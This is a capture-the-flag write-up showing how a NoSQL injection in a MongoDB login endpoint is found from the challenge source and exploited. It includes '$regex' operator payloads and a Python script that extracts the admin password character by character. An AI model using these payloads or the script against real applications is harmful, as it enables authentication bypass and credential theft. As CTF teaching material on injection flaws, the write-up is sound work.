## HEROS DataBase Breach (Points: 275)

The problem statement goes like this:

![image](https://user-images.githubusercontent.com/98008131/164887944-66b09647-b371-4d27-9e62-7c1ae0b4a118.png)

So we have a link to the actual page and also a download link for the source code. The question also hints us that we need to fiddle with the mongoDB database. On the website, we are asked a username and a password:

![image](https://user-images.githubusercontent.com/98008131/164889475-94e36514-bd7b-4fc4-a289-5796c687e2a5.png)

Let us download the tar file and unzip it to see its contents. In the file `entrypoint.sh`, we see this bit of code:

![image](https://user-images.githubusercontent.com/98008131/164888016-302383bc-91ac-4551-8fdb-2e27a12ade53.png)

So this suggests that entries `username: admin` and `password: CHTB{f4k3_fl4g_f0r_t3st1ng}` are added to the collection named `users`. This suggests that the username for login must be `admin` and password must be the real flag.

Looking around in the source file, we see the following code in `routes/index.js`:

![image](https://user-images.githubusercontent.com/98008131/164888216-160753b5-ba07-4526-ab40-fe15559408da.png)

So, it destructures `username` and `password` from the body of the request and then does `User.find(username, password)`. We can see that the code doesnt try to find an exact match for the username string and password string, but rather passes them as arguments to `User.find`. So we can pass in objects that look like MongoDB queries as both username and password. We know the username will be `admin`. For the flag, this is what we can do: 

The flag must begin with `wannahack{`, so the first letter is definitely `w`. We can pass the following object as the password, `{"$regex":"^w"}`. This will try to search if there is any entry that has username `admin` and `password` begins with `w`. When it finds that, it will return `{"logged": 1, "message": "Login Successful, welcome back admin."}`. If we instead searched for `x` instead of `w`, it would have given a different response. So by this we can be sure that the flag begins with `w`. When we are sure of that, we can go further and check `wa`, `wb`, and so on. It will return success message everytime we correctly guess first few letters of the flag. Trying to exploit this, we come up with the following code:

```python
import requests
import string

url = "http://wannahack.copsiitbhu.co.in:2437/"
headers = {"content-type": "application/json"}

leaked_data = list("wannahack{")

while True:
	for character in string.printable:
		if character not in ['*', '+', '.', '?', '"', '\\']:

			print(f"trying {''.join(leaked_data) + character}")

			payload = (
				'{"username": {"$eq": "admin"}, "password": {"$regex":"^%s"}}'
				% (''.join(leaked_data) + character,)
				)

			r = requests.post(url + 'api/login', data=payload, headers = headers)

			if r.json() == {
			"logged": 1,
			"message": "Login Successful, welcome back admin."
			}:
				leaked_data.append(character)
				break
```

Running the code, we brute force through every letter one by one until we finally achieve the password. The code output goes as follows after running some time:

![image](https://user-images.githubusercontent.com/98008131/164888724-db6131b4-213f-4484-b1b2-d4eda5bdbf73.png)

Tinkering with the output, we get that the flag is `wannahack{y0u_5u5t_H@ck3d_M0NG0_D5}`

The following youtube video definitely helped in formulating the solution: https://www.youtube.com/watch?v=7kmttmmlygc
